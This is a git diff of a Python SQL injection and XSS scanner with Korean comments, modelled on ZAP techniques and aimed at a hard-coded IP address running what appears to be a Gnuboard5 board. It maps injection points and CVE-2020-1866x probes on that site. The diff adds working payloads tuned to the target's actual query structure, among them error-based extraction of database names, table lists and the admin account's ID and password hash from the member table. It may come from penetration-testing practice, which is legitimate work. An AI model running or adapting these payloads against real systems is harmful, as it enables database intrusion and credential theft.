@@ -1,14 +1,4 @@
-"""
-SQLi / XSS Scanner v4 - ZAP 방식 개선 적용
-: Eyecatcher 컨텍스트 탐지 + Time-based double-check + Boolean 탐지 통합
-
-Usage:
-    python scanner.py
-    python scanner.py --payloads payloads_v2.json --out scan_results_v3.json
-    python scanner.py --point sqli_search_sfl --verbose
-"""
-
-import json
+﻿import json
 import time
 import argparse
 import sys
@@ -19,8 +9,8 @@ import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
-# ── 설정 ──────────────────────────────────────────────────────────
 
+# 설정
 TARGET_BASE = "http://34.68.27.120:8081"
 
 SLEEP_THRESHOLD   = 4.5   # TIME_BASED 탐지 기준 (초) — ZAP: baseline + SLEEP_DURATION - 0.2
@@ -90,11 +80,9 @@ CSV_CONTENT_TYPES = [
     "application/octet-stream",
 ]
 
-# ── Eyecatcher (ZAP 방식) ──────────────────────────────────────────
 # 무해한 마커를 먼저 전송해서 반사 위치(컨텍스트) 파악
 EYECATCHER = "zap7f3a9bmarker"
 
-# ── targets.json 자동 로드용 기본 페이로드 ─────────────────────────
 # crawler.py → analyzer.py → targets.json 연동 시 사용
 GENERIC_SQLI_PAYLOADS = [
     {"type": "SQLI_STRING", "family": "quote_error",     "payload": "'1'='1"},
@@ -171,7 +159,6 @@ XSS_CONTEXT_PAYLOADS = {
     ],
 }
 
-# ── ZAP 방식 Blind SQLi 기본 페이로드 (포인트별 자동 주입) ────────────
 # 참고: ZAP SqlInjectionScanRule — TRUE/FALSE 조건 비교
 #        ZAP SqlInjectionMySqlScanRule — baseline + SLEEP 방식
 #
@@ -179,9 +166,9 @@ XSS_CONTEXT_PAYLOADS = {
 # 탐지 흐름: measure_controls → boolean_possible → boolean_TRUE_condition
 #            measure_baseline → inject SLEEP → elapsed >= baseline + SLEEP - 0.2
 
+# Blind SQLi 페이로드 - 포인트별 ZAP 기반 자동 주입용
 BLIND_SQLI_PAYLOADS: dict = {
 
-    # ══ qalist.php sfl — 컬럼명 자리 CASE WHEN Boolean Blind ═══════
     # search.php sfl과 동일 구조
     "sqli_qalist_sfl": [
         {"type": "BOOLEAN", "family": "case_true",
@@ -196,7 +183,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": "(CASE WHEN (SLEEP(5)=0) THEN wr_subject ELSE wr_content END)"},
     ],
 
-    # ══ ZAP 탐지: qalist.php stx (싱글쿼트 컨텍스트) ════════════
     # ctrl_true:  "test' AND '1'='1' -- "
     # ctrl_false: "test' AND '1'='2' -- "
     "sqli_qalist_blind": [
@@ -219,7 +205,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
     ],
 
-    # ══ board.php wr_id (정수형 컨텍스트) ═══════════════════════
     # WHERE wr_id = INJECT → 따옴표 없이 직접 삽입
     # ctrl_true:  "1 AND 1=1-- -"
     # ctrl_false: "1 AND 1=2-- -"
@@ -240,7 +225,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
     ],
 
-    # ══ ZAP 탐지: password.php sod (더블쿼트, desc 값) ══════════
     # ctrl_true:  'desc" AND "1"="1" -- '
     # ctrl_false: 'desc" AND "1"="2" -- '
     "sqli_password_sod": [
@@ -256,7 +240,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": 'desc" AND IF(1=1,SLEEP(5),0) -- '},
     ],
 
-    # ══ ZAP 탐지: password.php sop (더블쿼트, and 값) ═══════════
     # ctrl_true:  'and" AND "1"="1" -- '
     # ctrl_false: 'and" AND "1"="2" -- '
     "sqli_password_sop": [
@@ -272,7 +255,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": 'and" AND IF(1=1,SLEEP(5),0) -- '},
     ],
 
-    # ══ search.php sfl — 컬럼명 자리 CASE WHEN Boolean Blind ═══════
     # SQL 구조: WHERE {sfl} LIKE '%{stx}%'
     # sfl은 컬럼명 위치 → 일반 ' OR 1=1 안 됨
     # CASE WHEN 기법: 조건 TRUE이면 wr_subject(ctrl_true≈20853),
@@ -299,7 +281,6 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": "(CASE WHEN (IF(1=1,SLEEP(5),0)=0) THEN wr_subject ELSE wr_content END)"},
     ],
 
-    # ══ search.php sst — ORDER BY 자리 에러/타임 기반 탐지 ══════════
     # SQL 구조: ORDER BY {sst} {sod}
     # ORDER BY는 boolean 길이 차이 없음 → Error / Time 탐지만 현실적
     # CASE WHEN으로 ORDER BY 컬럼 전환 → 정렬순 바뀌지만 길이는 동일
@@ -324,41 +305,48 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": "CASE WHEN (1=2) THEN wr_datetime ELSE wr_num END"},
     ],
 
-    # ══ search.php stx — 괄호 닫기 방식 Boolean + Time ═══════════
-    # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
-    # → %' AND 1=1)-- - 로 괄호 닫아서 탈출
-    # ctrl_true:  "%' AND 1=1)-- -"  → 모든 게시글 반환
-    # ctrl_false: "%' AND 1=2)-- -"  → 빈 결과
+    # 실제 SQL: SELECT wr_id FROM g5_write_test
+    #           WHERE ((INSTR(LOWER(wr_subject), LOWER('INPUT'))))
+    #
+    # 핵심:
+    #   1) stx는 PHP에서 공백으로 단어 분리 → 페이로드에 공백 금지
+    #   2) -- 주석은 뒤에 공백 필요 → 공백 없이 쓸 수 있는 # 사용
+    #   3) 닫아야 할 괄호: LOWER('x') → INSTR() → 외부 (( → 총 ))))
+    #
+    # ctrl_true:  "a'))))OR(1=1)#"  → 전체 게시글 반환 (OR TRUE)
+    # ctrl_false: "a'))))AND(1=2)#" → 0건 반환 (AND FALSE)
     "sqli_search_stx": [
-        # Boolean — 괄호 닫기
-        {"type": "BOOLEAN", "family": "paren_true",
-         "payload": "%' AND 1=1)-- -"},
-        {"type": "BOOLEAN", "family": "paren_false",
-         "payload": "%' AND 1=2)-- -"},
-        {"type": "BOOLEAN", "family": "paren_subq_tables",
-         "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
-        {"type": "BOOLEAN", "family": "paren_db_len",
-         "payload": "%' AND LENGTH(database())>0)-- -"},
-        {"type": "BOOLEAN", "family": "paren_db_char",
-         "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
-        # Time-based — 괄호 닫기 + SLEEP
-        {"type": "TIME_BASED", "family": "paren_sleep",
-         "payload": "%') AND SLEEP(5)-- -"},
-        {"type": "TIME_BASED", "family": "paren_if_sleep",
-         "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
-        # ZAP MySQL 방식 (기존 유지)
-        {"type": "TIME_BASED", "family": "zap_and_sleep",
-         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
-        {"type": "TIME_BASED", "family": "zap_if_sleep",
-         "payload": "%' AND IF(1=1,SLEEP(5),0) -- -"},
+        {"type": "BOOLEAN", "family": "instr_true",
+         "payload": "a'))))OR(1=1)#"},
+        {"type": "BOOLEAN", "family": "instr_false",
+         "payload": "a'))))AND(1=2)#"},
+        {"type": "BOOLEAN", "family": "instr_db_len",
+         "payload": "a'))))AND(LENGTH(database())>0)#"},
+        {"type": "BOOLEAN", "family": "instr_db_char",
+         "payload": "a'))))AND(SUBSTR(database(),1,1)>'a')#"},
+        {"type": "BOOLEAN", "family": "instr_subq_tables",
+         "payload": "a'))))AND((SELECT(1)FROM(information_schema.tables)LIMIT(0,1))=1)#"},
+        {"type": "SQLI_ERROR", "family": "extract_db",
+         "payload": "a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#"},
+        {"type": "SQLI_ERROR", "family": "extract_version",
+         "payload": "a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#"},
+        {"type": "SQLI_ERROR", "family": "extract_tables",
+         "payload": "a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#"},
+        {"type": "SQLI_ERROR", "family": "extract_admin",
+         "payload": "a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/0,1))))#"},
+        {"type": "SQLI_ERROR", "family": "extract_admin_pw",
+         "payload": "a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_password/**/FROM/**/g5_member/**/WHERE/**/mb_id=0x61646d696e/**/LIMIT/**/0,1))))#"},
+        {"type": "TIME_BASED", "family": "instr_sleep",
+         "payload": "a'))))AND(SLEEP(5))#"},
+        {"type": "TIME_BASED", "family": "instr_if_sleep",
+         "payload": "a'))))AND(IF(1=1,SLEEP(5),0))#"},
     ],
 }
 
-# ── 포인트별 설정 ─────────────────────────────────────────────────
 
+# 포인트별 설정 - URL, 파라미터, 제어값 정의
 POINT_CONFIG = {
 
-    # ══ Reflected XSS ════════════════════════════════════════════
 
     "xss_search_stx": {
         "url":    f"{TARGET_BASE}/bbs/search.php",
@@ -382,7 +370,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"sfl": "wr_subject"},
     },
 
-    # ══ SQLi: 필드 선택자 (sfl) ═══════════════════════════════════
 
     "sqli_search_sfl": {
         "url":    f"{TARGET_BASE}/bbs/search.php",
@@ -407,7 +394,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"stx": "test"},
     },
 
-    # ══ SQLi: ORDER BY 컬럼 (sst) ═════════════════════════════════
 
     "sqli_search_sst": {
         "url":    f"{TARGET_BASE}/bbs/search.php",
@@ -420,7 +406,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"stx": "", "sfl": "wr_subject", "sop": "and"},
     },
 
-    # ══ SQLi: 검색 키워드 문자열 컨텍스트 (stx) ═══════════════════
 
     "sqli_search_stx": {
         "url":    f"{TARGET_BASE}/bbs/search.php",
@@ -428,16 +413,15 @@ POINT_CONFIG = {
         "param":  "stx",
         "mode":   "sqli",
         "inject_extra": {"sfl": "wr_subject", "sop": "and"},
-        # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
-        # → 괄호 닫기: %' AND 1=1)-- - 로 탈출
-        # TRUE: LIKE '%%' AND 1=1) → 모든 게시글
-        # FALSE: LIKE '%%' AND 1=2) → 빈 결과
-        "ctrl_true":  "%' AND 1=1)-- -",
-        "ctrl_false": "%' AND 1=2)-- -",
+        # 실제 SQL: WHERE ((INSTR(LOWER(wr_subject), LOWER('INPUT'))))
+        # PHP가 stx를 공백으로 단어 분리 → 페이로드 공백 금지, # 주석 사용
+        # TRUE:  OR(1=1) → 전체 게시글 반환 (많은 bytes)
+        # FALSE: AND(1=2) → 0건 반환 (적은 bytes)
+        "ctrl_true":  "a'))))OR(1=1)#",
+        "ctrl_false": "a'))))AND(1=2)#",
         "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
     },
 
-    # ══ SQLi: 로그인 폼 (mb_id) ═══════════════════════════════════
 
     "sqli_login_mb_id": {
         "url":    f"{TARGET_BASE}/bbs/login_check.php",
@@ -451,7 +435,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"mb_password": "wrongpassword_xyz", "url": "/"},
     },
 
-    # ══ CVE-2020-18662: install/install_db.php table_prefix SQLi ═
     # PoC: table_prefix = "12'; select sleep(5)#"
     "cve_18662_install_sqli": {
         "url":    f"{TARGET_BASE}/install/install_db.php",
@@ -482,7 +465,6 @@ POINT_CONFIG = {
         },
     },
 
-    # ══ CVE-2020-18661: bbs/login.php url 파라미터 Reflected XSS ══
     "cve_18661_login_xss": {
         "url":    f"{TARGET_BASE}/bbs/login.php",
         "method": "GET",
@@ -494,7 +476,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ CVE-2020-18663: bbs/move_update.php XSS (bo_table) ═══════
     "cve_18663_move_xss": {
         "url":    f"{TARGET_BASE}/bbs/move_update.php",
         "method": "POST",
@@ -506,7 +487,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ search.php stx — 단순 quote 방식 재테스트 ════════════════
     "sqli_search_stx_fix": {
         "url":    f"{TARGET_BASE}/bbs/search.php",
         "method": "GET",
@@ -518,7 +498,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
     },
 
-    # ══ faq.php stx — SQLi ════════════════════════════════════════
     "sqli_faq_stx": {
         "url":    f"{TARGET_BASE}/bbs/faq.php",
         "method": "GET",
@@ -530,7 +509,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ faq.php stx — XSS ════════════════════════════════════════
     "xss_faq_stx": {
         "url":    f"{TARGET_BASE}/bbs/faq.php",
         "method": "GET",
@@ -542,10 +520,8 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ write_update.php — Stored XSS 우회 (로그인 필요 → 수동) ══
     # 아래 2개는 PAYLOAD_TO_POINT에서 None 처리 (수동 테스트 안내용)
 
-    # ══ 게시판 (board.php) — XSS ══════════════════════════════════
     "xss_board_stx": {
         "url":    f"{TARGET_BASE}/bbs/board.php",
         "method": "GET",
@@ -557,7 +533,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 게시판 (board.php) — SQLi stx ════════════════════════════
     "sqli_board_stx": {
         "url":    f"{TARGET_BASE}/bbs/board.php",
         "method": "GET",
@@ -569,7 +544,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"bo_table": "free", "sfl": "wr_subject"},
     },
 
-    # ══ 게시판 (board.php) — SQLi sfl ════════════════════════════
     "sqli_board_sfl": {
         "url":    f"{TARGET_BASE}/bbs/board.php",
         "method": "GET",
@@ -581,7 +555,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"bo_table": "free", "stx": "test"},
     },
 
-    # ══ 게시판 (board.php) — SQLi sst ════════════════════════════
     "sqli_board_sst": {
         "url":    f"{TARGET_BASE}/bbs/board.php",
         "method": "GET",
@@ -593,7 +566,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"bo_table": "free", "stx": "", "sfl": "wr_subject"},
     },
 
-    # ══ Ajax 회원 확인 — SQLi mb_id ══════════════════════════════
     "sqli_ajax_member": {
         "url":    f"{TARGET_BASE}/bbs/ajax.member_check.php",
         "method": "POST",
@@ -605,7 +577,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ move_update.php — from_bo_table XSS (CVE-2020-18663 retry)
     "xss_move_from_bo": {
         "url":    f"{TARGET_BASE}/bbs/move_update.php",
         "method": "POST",
@@ -617,7 +588,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ move_update.php — wr_id XSS ══════════════════════════════
     "xss_move_wr_id": {
         "url":    f"{TARGET_BASE}/bbs/move_update.php",
         "method": "GET",
@@ -629,7 +599,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 비밀번호 페이지 — url XSS ════════════════════════════════
     "xss_password_url": {
         "url":    f"{TARGET_BASE}/bbs/password.php",
         "method": "GET",
@@ -641,7 +610,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 프로필 페이지 — mb_id XSS ════════════════════════════════
     "xss_profile_mb": {
         "url":    f"{TARGET_BASE}/bbs/profile.php",
         "method": "GET",
@@ -653,7 +621,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 프로필 페이지 — mb_id SQLi ═══════════════════════════════
     "sqli_profile_mb": {
         "url":    f"{TARGET_BASE}/bbs/profile.php",
         "method": "GET",
@@ -665,7 +632,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 회원가입 폼 — mb_nick XSS ════════════════════════════════
     "xss_register_name": {
         "url":    f"{TARGET_BASE}/bbs/register_form.php",
         "method": "GET",
@@ -677,7 +643,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ 로그인 url — Open Redirect ════════════════════════════════
     "open_redirect_login": {
         "url":    f"{TARGET_BASE}/bbs/login.php",
         "method": "GET",
@@ -689,7 +654,6 @@ POINT_CONFIG = {
         "ctrl_extra": {},
     },
 
-    # ══ ZAP 발견: password.php — sod Boolean Blind SQLi ══════════
     # ZAP 탐지 payload: desc" AND "1"="1" --  vs  desc" AND "1"="2" --
     "sqli_password_sod": {
         "url":    f"{TARGET_BASE}/bbs/password.php",
@@ -709,7 +673,6 @@ POINT_CONFIG = {
         },
     },
 
-    # ══ ZAP 발견: password.php — sop Boolean Blind SQLi ══════════
     "sqli_password_sop": {
         "url":    f"{TARGET_BASE}/bbs/password.php",
         "method": "GET",
@@ -727,7 +690,6 @@ POINT_CONFIG = {
         },
     },
 
-    # ══ ZAP 발견: board.php — wr_id Boolean Blind SQLi ══════════
     # wr_id는 정수형 컨텍스트: WHERE wr_id = INJECT (따옴표 없음)
     # ZAP 방식: 1 AND 1=1-- - (TRUE) vs 1 AND 1=2-- - (FALSE)
     "sqli_board_wr_id": {
@@ -741,7 +703,6 @@ POINT_CONFIG = {
         "ctrl_extra": {"bo_table": "gallery"},
     },
 
-    # ══ ZAP 발견: qalist.php — Boolean Blind SQLi (URL 파라미터) ═
     "sqli_qalist_blind": {
         "url":    f"{TARGET_BASE}/bbs/qalist.php",
         "method": "GET",
@@ -756,8 +717,8 @@ POINT_CONFIG = {
 }
 
 
-# ── HTTP 세션 ──────────────────────────────────────────────────────
 
+# HTTP 세션
 def make_session() -> requests.Session:
     session = requests.Session()
     retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503])
@@ -771,8 +732,8 @@ def make_session() -> requests.Session:
     return session
 
 
-# ── 요청 전송 ─────────────────────────────────────────────────────
 
+# 요청 전송
 def send(session: requests.Session, config: dict,
          inject_value: str, extra: dict,
          timeout: int) -> Optional[dict]:
@@ -892,8 +853,8 @@ def probe_xss_context(session, config: dict, timeout: int) -> str:
     return "body"
 
 
-# ── 제어 기준 측정 ─────────────────────────────────────────────────
 
+# 제어 기준 측정
 def measure_controls(session, config: dict,
                      timeout: int) -> Tuple[Optional[dict], Optional[dict], bool, str, float]:
     """
@@ -933,15 +894,15 @@ def measure_controls(session, config: dict,
           f"→ Time 임계값: {baseline_time + SLEEP_DURATION - 0.2:.2f}s")
 
     if possible:
-        print(f"  [CTRL] 차이 {diff:.1%} → Boolean 탐지 가능 ✓")
+        print(f"  [CTRL] 차이 {diff:.1%} -> Boolean 탐지 가능 OK")
     else:
         print(f"  [CTRL] 차이 {diff:.1%} → Boolean 구분 불가 (Error/Time 탐지로 진행)")
 
     return ct, cf, possible, "", baseline_time
 
 
-# ── 탐지 판정 ──────────────────────────────────────────────────────
 
+# 탐지 판정
 def detect(record: dict, resp: dict,
            ctrl_true: Optional[dict], ctrl_false: Optional[dict],
            boolean_possible: bool,
@@ -950,7 +911,6 @@ def detect(record: dict, resp: dict,
 
     rtype = record["type"].upper()
 
-    # ══ XSS 탐지 ════════════════════════════════════════════════
     if mode == "xss" or "XSS" in rtype:
         found, marker = has_xss_marker(resp["text"])
         if found:
@@ -960,7 +920,6 @@ def detect(record: dict, resp: dict,
             return False, "xss_encoded: payload HTML-encoded (filtered)"
         return False, "xss_not_reflected"
 
-    # ══ 시간 지연 탐지 (ZAP 방식: baseline + SLEEP_DURATION - 0.2) ══
     if "TIME" in rtype or "SLEEP" in record["family"].lower():
         if resp.get("timeout") or resp["elapsed"] >= sleep_threshold:
             return True, (f"time_delay={resp['elapsed']:.2f}s "
@@ -968,12 +927,10 @@ def detect(record: dict, resp: dict,
         return False, (f"no_delay (elapsed={resp['elapsed']:.2f}s, "
                        f"threshold={sleep_threshold:.2f}s)")
 
-    # ══ 에러 문자열 탐지 ════════════════════════════════════════
     if has_mysql_error(resp["textl"]):
         matched = [p for p in MYSQL_ERRORS if p in resp["textl"]]
         return True, f"mysql_error: {matched[:2]}"
 
-    # ══ 로그인 우회 탐지 ════════════════════════════════════════
     if mode == "sqli_login":
         # 로그인 성공 시: 응답 크기 차이 or 특정 문자열
         success_signs = ["로그아웃", "logout", "마이페이지", "mypage", "mb_name"]
@@ -986,7 +943,6 @@ def detect(record: dict, resp: dict,
             pass
         return False, "login_failed_as_expected"
 
-    # ══ Boolean 탐지 ════════════════════════════════════════════
     is_bool = any(t in rtype for t in
                   ("BOOLEAN", "TAUTOLOGY", "CONDITIONAL", "EXIST",
                    "FIELD", "ORDERBY", "STRING", "LOGIN"))
@@ -1009,8 +965,8 @@ def detect(record: dict, resp: dict,
     return False, "no_signal"
 
 
-# ── 포인트별 스캔 ─────────────────────────────────────────────────
 
+# 포인트별 스캔
 def scan_point(session, point_name: str, payloads: dict,
                timeout: int, verbose: bool) -> List[dict]:
 
@@ -1070,7 +1026,6 @@ def scan_point(session, point_name: str, payloads: dict,
                     boolean_possible, mode,
                     sleep_threshold=effective_sleep_threshold)
 
-            # ── ZAP double-check: Time-based 오탐 방지 ────────────
             # Time delay 탐지 시 일반 요청으로 서버 상태 한번 더 확인
             if vulnerable and "time_delay" in reason:
                 print(f"\n    [DOUBLE-CHECK] 지연 탐지 → 서버 상태 재확인 중...")
@@ -1086,8 +1041,8 @@ def scan_point(session, point_name: str, payloads: dict,
                     print(f"    [DOUBLE-CHECK] 서버 과부하 판단 → 스킵 ({chk['elapsed']:.2f}s)")
                 else:
                     chk_t = chk["elapsed"] if chk else 0
-                    print(f"    [DOUBLE-CHECK] 확인 완료 ✓ "
-                          f"(정상 요청={chk_t:.2f}s → SQLi 확정)")
+                    print(f"    [DOUBLE-CHECK] 확인 완료 OK "
+                          f"(정상 요청={chk_t:.2f}s -> SQLi 확정)")
 
             if vulnerable:
                 total_vuln += 1
@@ -1134,8 +1089,8 @@ def scan_point(session, point_name: str, payloads: dict,
     return results
 
 
-# ── targets.json 자동 변환 ────────────────────────────────────────
 
+# targets.json 자동 변환 - crawler → analyzer 연동
 def build_points_from_targets(targets: List[dict]) -> Tuple[dict, dict]:
     """
     analyzer.py 출력(targets.json) → POINT_CONFIG 항목 + 페이로드 자동 생성
@@ -1198,8 +1153,8 @@ def build_points_from_targets(targets: List[dict]) -> Tuple[dict, dict]:
     return new_points, new_payloads
 
 
-# ── Main ──────────────────────────────────────────────────────────
 
+# Main
 def main():
     global SLEEP_THRESHOLD
     parser = argparse.ArgumentParser(
